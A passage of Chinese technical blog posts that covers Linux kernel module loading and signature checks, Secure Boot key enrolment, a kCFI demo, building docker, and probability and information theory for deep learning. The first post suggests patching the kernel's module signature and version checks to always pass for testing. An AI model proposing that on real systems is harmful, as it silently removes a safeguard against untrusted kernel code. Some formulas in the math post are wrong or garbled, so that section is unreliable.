  原则上来说，只要你对驱动进行签名或者配置，就能加载成功，但是当时赶时间验证，就想着直接把驱动校验部分的代码直接屏蔽了，达到了我们测试的目的。
  现在过了许久了，现在有经历来重温一下当初的问题，看看根源是什么，于是我们得了解驱动加载的通用流程，查看我们的驱动到底因为哪些原因加载失败。




linux驱动加载流程

  首先，我们知道linux驱动有两个关键入口函数,一般被module_init()/module_exit()宏进行处理。当我们想加载一个linux驱动的时候，一般我们使用insmod/modprobe来加载驱动，下面我们来看看执行insmod/modprobe时，到底发生了什么？
  经过简单的查询资料，驱动的处理涉及两个linux系统调用，他们是：
int syscall(SYS_init_module, void module_image[.len], unsigned long len,
            const char *param_values);
int syscall(SYS_finit_module, int fd,
            const char *param_values, int flags);
  根据man手册介绍，SYS_init_module三个参数分别是内核驱动文件内容、文件内容长度、内核驱动参数。
  下面我们深入内核看看，执行SYS_init_module时，到底发生了什么？
  根据linux v6.9.6 kernel/module/main.c文件
SYSCALL_DEFINE3(init_module, void __user *, umod,
		unsigned long, len, const char __user *, uargs)
&#123;
	int err;
	struct load_info info = &#123; &#125;;

    // ... ...

	err = copy_module_from_user(umod, len, &amp;info);

    // ... ...

	return load_module(&amp;info, uargs, 0);
&#125;
  这里最重要的就是通过copy_module_from_user给struct load_info赋值。
  然后到了load_module函数（根据linux v6.9.6 kernel/module/main.c文件）：
static int load_module(struct load_info *info, const char __user *uargs,
		       int flags)
&#123;
	struct module *mod;
	bool module_allocated = false;
	long err = 0;
	char *after_dashes;

	/*
	 * Do the signature check (if any) first. All that
	 * the signature check needs is info->len, it does
	 * not need any of the section info. That can be
	 * set up later. This will minimize the chances
	 * of a corrupt module causing problems before
	 * we even get to the signature check.
	 *
	 * The check will also adjust info->len by stripping
	 * off the sig length at the end of the module, making
	 * checks against info->len more correct.
	 */
	err = module_sig_check(info, flags);
	if (err)
		goto free_copy;

	/*
	 * Do basic sanity checks against the ELF header and
	 * sections. Cache useful sections and set the
	 * info->mod to the userspace passed struct module.
	 */
	err = elf_validity_cache_copy(info, flags);
	if (err)
		goto free_copy;

	err = early_mod_check(info, flags);
	if (err)
		goto free_copy;
    
	/* Figure out module layout, and allocate all the memory. */
	mod = layout_and_allocate(info, flags);
	if (IS_ERR(mod)) &#123;
		err = PTR_ERR(mod);
		goto free_copy;
	&#125;


    // ... ...

    return do_init_module(mod);

    // ... ...
&#125;
  在 load_module 中，我们找到了3个重要的验证接口，一个是签名验证、一个是elf文件验证、一个是模块本身的信息验证。其中签名验证、模块本身的信息验证就是本文要关注的地方。经过了一系列的验证和初始化后，调用了do_init_module接口。
static noinline int do_init_module(struct module *mod)
&#123;
	int ret = 0;
	struct mod_initfree *freeinit;

    //... ...
	/* Start the module */
	if (mod->init != NULL)
		ret = do_one_initcall(mod->init);
	if (ret &lt; 0) &#123;
		goto fail_free_freeinit;
	&#125;
	if (ret > 0) &#123;
		pr_warn("%s: '%s'->init suspiciously returned %d, it should "
			"follow 0/-E convention\n"
			"%s: loading module anyway...\n",
			__func__, mod->name, ret, __func__);
		dump_stack();
	&#125;    

    //... ...
&#125;
  看这里的do_one_initcall(mod-&gt;init)，就相当于调用了我们通过module_init()定义的接口了。
  但是这里有一个问题？那就是mod-&gt;init是module_init()定义的接口，那它是怎么赋值的呢？要回答这个问题，还要回到我们创建一个ko文件的时候，有两个地方我们需要关注，这里我们随便创建一个helloworld的驱动为例：
/* Each module must use one module_init(). */
#define module_init(initfn)					\
	static inline initcall_t __maybe_unused __inittest(void)		\
	&#123; return initfn; &#125;					\
	int init_module(void) __copy(initfn) __attribute__((alias(#initfn)));

static int __init hello_init(void)
&#123;
    printk(KERN_INFO "Hello, World!\n");
    return 0; 
&#125;

module_init(hello_init);
  上面可以看到，我们通过module_init()这个宏，我们声明了一个叫做init_module函数，且此函数是hello_init的别名(alias是gcc的扩展用法)，换句话说我们调用init_module就等于调用了hello_init。
  此外，在我们生成ko文件的时候，还会看到一个被创建的xxx.mod.c的文件，里面有一个地方定义很重要：
__visible struct module __this_module
__section(.gnu.linkonce.this_module) = &#123;
	.name = KBUILD_MODNAME,
	.init = init_module,
#ifdef CONFIG_MODULE_UNLOAD
	.exit = cleanup_module,
#endif
	.arch = MODULE_ARCH_INIT,
&#125;;
  注意看这里的__this_module这个变量，这个变量其成员有init_module这个函数的地址信息，也就有了hello_init的地址信息，且这个__this_module变量被放到了.gnu.linkonce.this_module这个section里面。
  如果了解elf文件格式的，一定对section这个东西不陌生，其存放了很多elf相关内容，在这里，我们只需要关注.gnu.linkonce.this_module小节，就是__this_module的地址，这个会在驱动加载的时候用上。
  上面我们知道了init_module被放置到__this_module.init字段去了，那么执行do_one_initcall(mod-&gt;init)时，mod-&gt;init是怎么初始化的呢？下面我们接着分析mod-&gt;init的赋值，首先我们要回到SYS_init_module调用时，有一个load_module函数，在load_module函数中，有一个elf_validity_cache_copy()函数：
static int elf_validity_cache_copy(struct load_info *info, int flags)
&#123;
	unsigned int i;
	Elf_Shdr *shdr, *strhdr;
	int err;
	unsigned int num_mod_secs = 0, mod_idx;
	unsigned int num_info_secs = 0, info_idx;
	unsigned int num_sym_secs = 0, sym_idx;

	//... ...
	for (i = 1; i &lt; info->hdr->e_shnum; i++) &#123;
		shdr = &amp;info->sechdrs[i];
		switch (shdr->sh_type) &#123;
			// ... ...
		default:
			// ... ...
			if (strcmp(info->secstrings + shdr->sh_name,
				   ".gnu.linkonce.this_module") == 0) &#123;
				num_mod_secs++;
				mod_idx = i;
			&#125; else if (strcmp(info->secstrings + shdr->sh_name,
				   ".modinfo") == 0) &#123;
				num_info_secs++;
				info_idx = i;
			&#125;
			// ... ...
		&#125;
	&#125;

	// ... ...
	info->index.mod = mod_idx;

	/* This is temporary: point mod into copy of data. */
	info->mod = (void *)info->hdr + shdr->sh_offset;

	/// ... ...	
&#125;
  这里其实就是遍历section数组，然后得到.gnu.linkonce.this_module在section数组中的idx，并记录到info-&gt;index.mod中。（此处如果不明白，建议可以简单看看elf格式介绍，本文不分析这个）
  然后在load_module函数中的layout_and_allocate()中，会处理info-&gt;index.mod：
static struct module *layout_and_allocate(struct load_info *info, int flags)
&#123;
	struct module *mod;
	unsigned int ndx;
	int err;

	// ... ...

	/* Module has been copied to its final place now: return it. */
	mod = (void *)info->sechdrs[info->index.mod].sh_addr;
	kmemleak_load_module(mod, info);
	return mod;
&#125;
  在此函数对mod赋值的过程中，就把ko文件的__this_module变量的地址，绑定给了mod，然后mod往后面传，就可以执行mod-&gt;init函数了，也就是执行hello_init。




驱动校验加载

  对上文我们提到的load_module中有三个驱动校验相关的函数：


module_sig_check


elf_validity_cache_copy


early_mod_check


  其中elf_validity_cache_copy是对驱动二进制格式进行校验的，一般我们正常的驱动是满足条件的。因此，我们主要是去解决module_sig_check和early_mod_check的问题。
  对于module_sig_check来说，就是利用签名算法（可参考之前文章《常用加密及其相关的概念、简介（对称、AES、非对称、RSA、散列、HASH、消息认证码、HMAC、签名、CA、数字证书、base64、填充）》 https://www.cnblogs.com/Iflyinsky/p/18076852 ），保证内核驱动使用了内核认可的私钥进行签名，然后内核使用公钥进行验证。
  对于early_mod_check来说，就是校验内核版本信息、模块信息等等，这里就不详细介绍了。
  总的来说，如果我们要关闭内核的相关校验，可以通过以下的配置，或者直接处理module_sig_check、early_mod_check两个函数即可达到我们的目的。
CONFIG_MODULE_SIG=y
CONFIG_MODULE_SIG_FORCE=y
CONFIG_MODULE_SIG_ALL=y
CONFIG_MODULE_SIG_SHA256=y
CONFIG_MODVERSIONS=y
  特别注意，如果是在android系统里面，有些情况下（例如qcom的源码），你关闭了这些检测，会导致android系统编译失败，因为android kernel配置的安全检测无法通过。所以需要直接修改module_sig_check和early_mod_check函数，直接返回通过即可，这样即可测试。




后记

  通过阅读源码，感觉对内核各个模块的工作越来越熟悉了。
  但是越了解的多，越觉得未知越多。
参考文献


《常用加密及其相关的概念、简介（对称、AES、非对称、RSA、散列、HASH、消息认证码、HMAC、签名、CA、数字证书、base64、填充）》  https://www.cnblogs.com/Iflyinsky/p/18076852







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux驱动</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux安全启动及Machine Owner Key(UEFI BIOS MBR GPT GRUB)</title>
    <url>/2024/07/21/blog_idx_134/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  只要装过各种系统的人都或多或少会接触到UEFI或者BIOS这样的概念。本文也不会对这些概念进行详解，本文主要把这些概念串起来，并引入MOK(Machine Owner Key)。
  为什么需要MOK，是因为在使用现代linux系统时（如：PVE），如果我们需要自己安装一些自己构建的驱动（例如想实现gpu sr-iov），会用到此功能。




UEFI/BIOS

  BIOS (Basic Input/Output System) 和UEFI (Unified Extensible Firmware Interface) 这两个名字或者功能我们非常的熟悉了，机器开机自检完成后，一般f2/del等进入的界面，就是这个系统在显示工作。如果我们不按f2/del等键，系统会默默运行BIOS或者UEFI，然后自动加载引导程序，然后加载OS来运行。
  UEFI主要是为了取代BIOS系统的，因为其有：支持更多分区、启动速度快、支持更多硬件、更加安全、维护简单（统一标准）等等优点。其有个大的缺点就是，有些时候会因为安全的问题，需要更多的设置过程。
  对于BIOS来说，机器开机自检完成后，自动读取MBR（Master boot record），一般在磁盘的开始的扇区，然后加载OS或者其他进行启动。注意，这里MBR分区是一种老旧的分区格式了。
  对于UEFI来说，机器开机自检完成后，自动读取GPT分区(GUID Partition Table)中的EFI分区，然后加载OS或者其他进行启动。
  总的来说，随着时间的推进，UEFI是一种标准，已经被各大厂商支持和实现了。BIOS其已经完成了其历史的作用，除了为了兼容老机器，否则我们不应该使用它。




Linux 在UEFI下，自构建驱动安装问题

  这里有一个背景知识，那就是现代的linux内核，在加载内核驱动的时候，一般都会对内核驱动做一系列校验，其中一项就是做签名校验，如果校验失败，内核拒绝加载驱动。对于这部分内容，可以参考《Linux驱动加载源码分析（安全加载 、签名、校验）》 https://www.cnblogs.com/Iflyinsky/p/18301894 一文。
  在《常用加密及其相关的概念、简介（对称、AES、非对称、RSA、散列、HASH、消息认证码、HMAC、签名、CA、数字证书、base64、填充）》 https://www.cnblogs.com/Iflyinsky/p/18076852 中我们介绍了签名的原理，这里简单提一下：首先有非对称加密算法生成公钥、私钥。然后对消息进行摘要，对摘要进行私钥加密得到签名，最后可以用公钥来验证（解密）此签名是否正确。
  那么对应到内核驱动签名验证这里就是：首先对驱动模块使用私钥进行签名，并将签名文件写入驱动模块文件中，当我们加载驱动模块时，内核会使用其带的公钥来对驱动模块进行签名验证。
  注意，这里有一个重要的问题是：内核带的公钥是哪里来的？一般来说，有两个渠道可以增加内核的公钥，一个是编译内核的时候，一个是通过运行时的一些方法动态写入一些公钥到内核。


Machine Owner Key

  在实际我们自己测试自己的驱动模块的时候，一般都会自己生成一个私钥，公钥对来对自己的驱动模块进行签名。但是在启用的UEFI+ 支持安全启动的linux系统上，我们的驱动模块是无法正常加载的，因为我们的驱动无法过签名验证。
  从上面的描述来看，如果要成功加载我们的内核模块，那么我们应该把我们的公钥传给内核。
  在解决怎么把公钥传给内核前，我们第一步要简单了解一下linux secure boot的简单流程：


机器开机及硬件自检完成，然后进入uefi固件,uefi固件里面有微软公钥。


uefi加载shim固件（独立与linux发行版，被微软私钥预先签名，例如这个包： https://packages.debian.org/sid/amd64/shim-signed ）。此外shim有各大发行版公钥。


shim固件加载grub固件（grub固件被各大发行版私钥签名）。


grub加载linux签名内核。


  其实从上面的流程来看，就是一环环签名校验，保证了信任链的传递。
  回到我们之前的问题，我们怎么把我们私钥、公钥传给内核呢？必定是有一个工具能够将相关信息传进去，这个工具就是mokutil工具。


mokutil
  简而言之，shim除了自带发行版的公钥外，还维护一个用户可以操作的密钥数据库，里面存储的是Machine Owner Key。通过mokutil工具，我们可以增加和删除这些密钥。这样我们就可以将我们自己的模块签名公钥嵌入到了UEFI启动流程中去，然后根据适当的方法即可交给内核使用，并能够加载我们自己密钥签名的驱动程序。
  mokutil工具添加过程:


导入公钥


mokutil --import /var/lib/dkms/mok.pub 
# 并输入一次性密码


重启系统，此时新一次的uefi的启动流程会启动mok管理器，让用户按照要求注册新的密钥，并输入之前的一次性密码。(弹个框，自己选择，输入密码即可)


这样启动系统后，我们的密钥成功加载。


测试系统是否成功注册密码


mokutil --test-key /var/lib/dkms/mok.pub
  这样我们就可以使用mok.pub对应的私钥对我们的驱动进行签名，然后就可以正常使用公钥验证，然后加载驱动了。
  此外，这里还要多提一下，其实android的安全加载也有类似的过程，也是两个要点：信任链传递、驱动签名。




后记

  了解了越来越多计算机的知识，不得不感叹：知识总是不经意间出现在日常生活工作中。
参考文献


https://wiki.debian.org/UEFI


https://wiki.debian.org/SecureBoot


https://docs.redhat.com/zh_hans/documentation/red_hat_enterprise_linux/7/html/kernel_administration_guide/sect-signing-kernel-modules-for-secure-boot


https://www.cnblogs.com/Iflyinsky/p/18301894


https://www.cnblogs.com/Iflyinsky/p/18076852







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux驱动</tag>
        <tag>UEFI</tag>
        <tag>linux安全启动</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel CFI机制简介及测试禁用</title>
    <url>/2024/07/28/blog_idx_135/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  当我们为android移植linux的驱动程序的时候，总会遇到一些错误，这些错误有一部分就是android 内核开启的安全的机制导致的。本文就会介绍一种内核的安全机制：Kernel Control Flow Integrity（kCFI）。
  此外，这里还要说明一下，Control Flow Integrity（CFI）与 Kernel Control Flow Integrity（kCFI）是不一样的，kCFI只检查函数指针，CFI还具备其他很多的检查，详情请参考：https://clang.llvm.org/docs/ControlFlowIntegrity.html 。




Kernel Control Flow Integrity（kCFI）原理简单介绍

  Control Flow Integrity的翻译是控制流完整性，从直译来看，其实就是用一些方法保证来保证我们的指令执行到正确的位置。我们从clang官方文档知道，kCFI只检查函数指针，那么其实kCFI就是保证函数指针跳转到正确的位置，并且返回到正确的位置。
  从这里来看，其实我们可以看到对于函数指针来说，我们需要保护两个地方：跳转到正确的位置、返回到正确的位置。这两个地方有两个专有名词：


forward-edge


backward-edge


  此外，我们还应该知道，在编写代码的时候，分为直接函数调用（direct function call），间接函数调用（indirect function call）。他们的示例如下：
void target(void)
&#123;
    //... ...
&#125;

typedef void(*fn)(void);
int main(int argc, char * argv[])
&#123;
    // direct function call
    target();

    //indirect function call
    fn _id_fn = target;
    _id_fn();
&#125; 
  从示例可以知道，indirect function call其实就是函数指针这种调用形式。
  此外，我们还要知道，如果我们想破坏代码的执行流，那么我们必须在可写、可读、可执行的内存里面写入shellcode，并跳转到这个shellcode，否则我们的代码是无法工作的。那么显而易见的事情是，通过函数指针来调用函数，我们的目标是明确的，因此我们可以校验这些目标的原型、地址等等信息。
  因为我们需要验证目标的原型、地址等等信息，所以，当我们在生成可执行文件的时候，需要知道所有的函数目标的信息，这个时候，就需要一个叫做Link Time Optimization（LTO）的功能，因为只有最终可执行文件链接时，才知道所有的函数目标信息。




kCFI演示示例

  首先在qemu中运行一个arm64的linux模拟器，然后为linux内核配置如下内核选项：
# General architecture-dependent options -> LTO
CONFIG_CFI_CLANG=y
CONFIG_CFI_PERMISSIVE=y
  我们的测试驱动例子：
#include &lt;linux/module.h>  // 必须的头文件，定义了MODULE_*宏
#include &lt;linux/kernel.h>  // 包含内核信息头文件
#include &lt;linux/init.h>    // 包含 __init 和 __exit 宏

static int param_int = 0;
module_param(param_int, int, 0644);

static void hello_cfi_i(int i)&#123;
    printk(KERN_INFO "hello_cfi_i\n");
&#125;
static void hello_cfi_f(float i)&#123;
    printk(KERN_INFO "hello_cfi_f\n");
&#125;

typedef void (*hello_cfi_func_i)(int);
typedef void (*hello_cfi_func_f)(float);


struct node &#123;
    hello_cfi_func_i i0[1];
    hello_cfi_func_f f0[1];
    hello_cfi_func_i i1[1];
    hello_cfi_func_f f1[1];
    hello_cfi_func_i i2[1];
    hello_cfi_func_f f2[1];
&#125;;
struct node fn_arr = &#123;
    .i0 = &#123;hello_cfi_i&#125;,
    .f0 = &#123;hello_cfi_f&#125;,
    .i1 = &#123;hello_cfi_i&#125;,
    .f1 = &#123;hello_cfi_f&#125;,
    .i2 = &#123;hello_cfi_i&#125;,
    .f2 = &#123;hello_cfi_f&#125;,
&#125;;
// 模块初始化函数
static int __init hello_init(void)
&#123;

    fn_arr.i0[param_int](param_int);

    printk(KERN_INFO "Hello, World!\n");
    return 0;  // 返回0表示加载成功
&#125;

// 模块清理函数
static void __exit hello_exit(void)
&#123;
    printk(KERN_INFO "Goodbye, World!\n");
&#125;

// 注册模块初始化和清理函数
module_init(hello_init);
module_exit(hello_exit);

MODULE_LICENSE("GPL");  // 模块许可证
MODULE_AUTHOR("Your Name");  // 模块作者
MODULE_DESCRIPTION("A simple Hello World Module");  // 模块描述
  我们传入参数0，执行fn_arr.i0[0]，测试正常跳转

    
        
    
  
  我们传入参数1，执行fn_arr.i0[1]，测试传入参数原型不匹配（本来应该调用hello_cfi_i，实际调用hello_cfi_f）

    
        
    
    
  测试数组越界访问

    
        
    
    




后记

  从上面来看，kCFI一般会对调用类型、调用的目标地址进行判断，更多细节，去看CFI的具体原理。
参考文献


https://clang.llvm.org/docs/ControlFlowIntegrity.html


https://source.android.com/docs/security/test/kcfi


https://outflux.net/slides/2020/lca/cfi.pdf







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux驱动</tag>
        <tag>UEFI</tag>
        <tag>CFI</tag>
      </tags>
  </entry>
  <entry>
    <title>docker&amp;dockerd源码构建</title>
    <url>/2024/08/04/blog_idx_136/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  在docker公司的网站上已经提供了绝大部分平台的预构建的安装包情况下，为什么要自己构建docker及dockerd呢？因为我们需要定制docker的一些功能或者命令，例如：增加docker命令做特殊响应，docker相关加密等等。




docker基本架构简介

  docker实际分为两个部分，一个是dockerd守护程序，一个是docker前端程序，他们之间通过uds连接。docker通过解析前端用户命令，并调用相关网络接口访问dockerd，dockerd执行具体的操作，并返回相关内容给docker。
  dockerd的源码库是：https://github.com/moby/moby.git
  docker的源码库是：https://github.com/docker/cli.git




dockerd源码构建

  dockerd源码构建分为两个部分：


构建dockerd构建环境容器：docker-dev


使用docker-dev容器来构建dockerd程序。




docker-dev容器构建
  执行如下命令就能够成功构建docker-dev容器：
git clone -b xxx https://github.com/moby/moby.git
cd moby
make build
  一切顺利的情况下，一般来说，上面的容器环境能够成功搭建。但是如果你在国内，99%的可能性不能搭建成功。
  下面有几个地方需要处理：


moby/Dockerfile是docker-dev容器的配置文件，里面的每一个FROM指令（或者自己识别带了docker/http/https/git等下载相关指令的）下面，需要通过RUN或者ENV等等指令设置 docker/http/https/git 等环境的代理。


moby/contrib/download-frozen-image-v2.sh文件会下载一些容器层，需要设置http/https的代理。




dockerd程序构建
  执行如下命令就能够成功构建dockerd程序：
cd moby
# 构建x86-64 linux版本
docker buildx bake --set binary.platform=linux/amd64

# 构建arm64 linux版本
docker buildx bake --set binary.platform=linux/arm64
  构建成功后，可以在moby/bundles/binary目录里面看到对应的构建成功的文件：dockerd和docker-proxy 两个文件。




docker 源码构建

  docker源码构建简单，基本还是和dockerd构建类似：执行如下命令就能够成功构建dockerd程序：
git clone -b xxx https://github.com/docker/cli.git
cd cli
# 构建x86-64 linux版本
docker buildx bake --set binary.platform=linux/amd64

# 构建arm64 linux版本
docker buildx bake --set binary.platform=linux/arm64
  构建成功后，可以在cli/build目录里面看到对应的构建成功的文件：docker-linux-amd64 或者 docker-linux-arm64。
  注意，和构建dockerd的docker-dev容器类似，这里构建的时候也会拉取一些容器来构建，如果遇到了一些错误，也需要对 docker/http/https/git等尽量设置代理。




后记

  无
参考文献


https://github.com/moby/moby.git


https://github.com/docker/cli.git







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>linux</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>大模型基础补全计划(一)---重温一些深度学习相关的数学知识</title>
    <url>/2025/02/15/blog_idx_137/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  遥记在2021年左右，我写了一系列关于深度学习视觉方向基础学习的文章，它们如下：


DL基础补全计划(一)—线性回归及示例（Pytorch，平方损失） https://githubio.e-x.top/2021/07/04/blog_idx_105/


DL基础补全计划(二)—Softmax回归及示例（Pytorch，交叉熵损失） https://githubio.e-x.top/2021/07/11/blog_idx_106/


DL基础补全计划(三)—模型选择、欠拟合、过拟合 https://githubio.e-x.top/2021/07/18/blog_idx_107/


DL基础补全计划(四)—对抗过拟合：权重衰减、Dropout https://githubio.e-x.top/2021/08/01/blog_idx_108/


DL基础补全计划(五)—数值稳定性及参数初始化（梯度消失、梯度爆炸） https://githubio.e-x.top/2021/08/08/blog_idx_109/


DL基础补全计划(六)—卷积和池化 https://githubio.e-x.top/2021/08/15/blog_idx_110/


  那时候的我，还一心沉醉在视觉算法模型落地到侧端的各个场景，虽然对NLP有所了解，但是当时还未料想到，在后面的几年，由大语言模型引爆的大模型领域是如此的火爆。到了2023左右，开始逐渐的接触大模型，逐渐的将其应用到自己的工作中，逐渐在工作中将大模型迁移到侧端。从2024年开始，意识到如果要在以后将大模型应用的更好，急需要补充一些大模型及NLP相关的知识才能更好的理解它。因此有了从本文开始的一系列文章。
  从本文开始，预计从数学知识开始，到transformer及LLM结束（挖坑），挑选一些内容来学习记录。




概率论、数理统计

  


基本概念
  在统计学中，把需要调查或者研究的某一现象或者事物的全部数据称为统计总体（简称 总体population)，其所属的数据分布称为 总体分布 (population distribution)， 单个数据称为个体(individual)。我们从统计总体中抽取样本的过程称为抽样（sampling），一次抽样的结果称为一份样本(sample)，一份样本中包含的个体数据的数量称为本容量(sample size)。
  可以把分布（distribution）看作对事件的概率分配，P(X)表示为随机变量X上的分布（distribution）, 分布告诉我们X获得某一值的概率
  概率（probability）在给定的样本空间中，A事件的发生的可信度， 表示为P(A)
  推断统计学（或称统计推断，英语：statistical inference）， 指统计学中，研究如何根据样本(sample)数据去推断总体(population)特征（或者参数）的方法， 比如根据样本的平均值去估计总体的均值参数。 它是在对样本数据进行描述的基础上，对统计总体的未知数量特征做出以概率形式表述的推断。
  通常我们会假设总体分布服从某种已知的概率分布，但是分布的某些参数是不确定的， 比如全国身高数据服从正态分布，但是期望和方差不知道， 这时我们期望能通过样本推断（估计）出总体正态分布的期望和方差参数。
  概率（probability）和统计（statistics）看似两个相近的概念，其实研究的问题刚好相反。


概率研究的是，已经知道了模型和参数后，给出一个事件发生的概率。θ是已知确定的，x是变量，这个函数叫做概率函数(probability function)，它描述对于不同的样本点x，其出现概率是多少（表示不同x出现的概率）。概率函数记作$P(X=x_i|\theta)$。


统计是根据给出的观测数据，利用这些数据进行建模和参数的预测。x是已知确定的，θ是变量，这个函数叫做似然函数(likelihood function),  它描述对于不同的模型参数θ，出现x这个样本点的概率是多少(表示不同θ下，x出现的概率）。此时的函数也记作$L(\theta|X=x_i)$。




联合概率
  给定任意值a和b，联合概率可以回答：A=a和B=b同时满足的概率是多少，其表示为 $P(A=a,B=b)=P(A=a)*P(B=b)$


条件概率
  联合概率的不等式带给我们一个有趣的比率：$0&lt;= \frac{P(A=a,B=b)}{P(A=a)} &lt;=1$，表示为$P(B=b|A=a)$, 代表在A=a已发生的情况下，B=b的概率。也就是 $P(B=b|A=a) = \frac{P(A=a,B=b)}{P(A=a)} $。


贝叶斯定理
  因为条件概率公式：$P(B=b|A=a) = \frac{P(A=a,B=b)}{P(A=a)} ，P(A=a|B=b) = \frac{P(A=a,B=b)}{P(B=b)} $。然后我们观察两个条件概率表达式,可看到有公有的联合概率部分，改变方程即可得到：$P(A,B) = P(A|B) * P(B) = P(B|A) * P(A)$ ，这个就是贝叶斯公式。
此外此定理在深度学习中有一些特殊的解释：


P(A|B)：在事件 B 已经发生的情况下，事件 A 发生的后验概率 。


P(B|A)：在事件 A 已经发生的情况下，事件 B 发生的似然 。


P(A)：事件 A 的先验概率（在没有额外信息时对 A 的概率估计）。


P(B)：事件 B 的边缘概率（即 B 发生的总概率）。


首先我们定义一个深度学习的模型为：$P(\theta,D) = \frac{P(D|\theta) * P(\theta)}{P(D)}$, 其参数为 θ，训练数据为 D。我们的目标是根据数据 D 来更新对参数 θ 的估计,这里我们来看一个例子：


$P(\theta | D) $：在观察到数据 D 后，参数 $\theta $ 的后验分布 。


$P(\theta) $：参数 $\theta $ 的先验分布 （在没有看到数据之前对参数的假设）。


$P(D | \theta) $：在给定参数 $\theta$ 的情况下，生成数据 D  的似然函数 。


$P(D) $：数据 D 的边缘概率 （归一化常数）




边际化
  B的概率相当于计算A的所有可能选择，并将所有选择的联合概率聚合在一起：$P(B) = \sum\limits_{i=1}^{n} P(A_i,B) , P(A) = \sum\limits_{i=1}^{n} P(B_i,A)$


期望、均值、方差、概率
  一个随机变量X的期望（expectation，或平均值（average））表示为: $E(X) = \sum\limits_{x=1}^{n} x_i * P(X=x_i)$
  均值是一个统计量(基于样本构造的函数)，更偏统计学的概念；而期望完全由随机变量的概率分布所确定（更偏概率学的概念），类似于在“上帝视角”下去计算均值，所谓上帝视角是指你拥有的是总体并且知道总体所有取值出现的概率
  希望衡量随机变量X与其期望值的偏置。这可以通过方差来量化：$V(X) = \frac{\sum\limits_{i=1}{n}(x_i-E(X_i))2}{n}$


似然函数及最大似然估计
  似然估计函数,其可以解释为：假设我们有一个关于X的概率分布是$P(X=x|\theta)$，$\theta$是关于X的概率分布的参数。假如我们从关于X的概率分布是$P(X=x|\theta)$中抽取n个样本（这个时候往往我们是不知道其参数$\theta$的），这个时候我们想去估计$\theta$，因此我们可以定义似然函数为： $L(\theta|x_i,i\in{n}) = \prod\limits_{i=1}^{n} P(x_i|\theta)$。
  注意，我们可以知道由于有n个样本，每个样本都有一个$P(x_i|\theta)$，因此n个样本的联合概率就是似然函数，根据联合概率的定义，似然函数就是描述在$x_i$出现概率已知的情况下，出现$\theta$的概率。
  最大似然估计（Maximum Likelihood Estimation，MLE），又叫极大似然估计，是统计学中应用最广泛的一种未知参数估计方法。 它可以在已知随机变量属于哪种概率分布的前提下， 利用随机变量的一些观测值估计出分布的一些参数值。
  最大似然估计函数 就是 对似然估计函数 取对数，以简化乘积的计算。那么其定义是：$L(\theta|x_i,i\in{n}) = \sum\limits_{i=1}^{n} \ln{P(x_i|\theta)}$，对其求最大值就等于对其求 负最小值，其定义为：$-\ln_{}{L(\theta|x_i,i\in{n})} = -\sum\limits_{i=1}^{n} \ln(P(x_i|\theta))$




信息论

  


基本概念
  根据信息论中的定义：


信息量，事件发生概率越大，所携带的信息量越小。定义为：$I(x)=\log_{2}(\frac{1}{P(x)})=-\log_{2}(P(x))=表示此事件的最少比特位数$ ,其也蕴含了我们需要使用多个比特才能表示信息量。


信息熵，一个随机变量的熵是指该变量可能的结果所蕴含的不确定性的平均水平。可以类别期望的定义，这里得到信息量的均值：$H(X)=-\sum\limits_{i=0}^{n-1}P(Xi)\log_{2}(P(Xi))$


KL差异：定义原概率分布为P(X),近似概率分布为Q(X)，假如X是离散随机变量，KL差异定义为：$D_{KL}(P(X)||Q(X))=\sum\limits_{i=0}{n-1}P(Xi)\log_{2}(P(Xi)/Q(Xi))=\sum\limits_{i=0}{n-1}P(Xi)[\log_{2}(P(Xi)) - \log_{2}(Q(Xi))]$


交叉熵（cross-entropy），交叉熵定义为：$H(P,Q)=-\sum\limits_{i=0}^{n-1}P(Xi)\log_{2}(Q(Xi))$，我们可以看到$H(P,Q)=H(P)+D_{KL}(P||Q)$




深度学习中的交叉熵
  假如: 数据集{X, Y}有n个样本，有特征向量$x_i \in X$，独热标签向量$y_i \in Y$，当前模型最终softmax输出的向量$\hat{y}_i$。首先，我们将$\hat{y}_i$当做给定特征向量$x_i$的每个类别的条件概率。因此我们可以得到：$\hat{y}_i=P(y_i|x_i)$
  根据似然函数定义：$L(\theta) = \prod_{i=1}^{n} P(y_i|x_i,\theta)$，其代表给定$x_i, \theta$情况下，观察到$y_i$的概率。
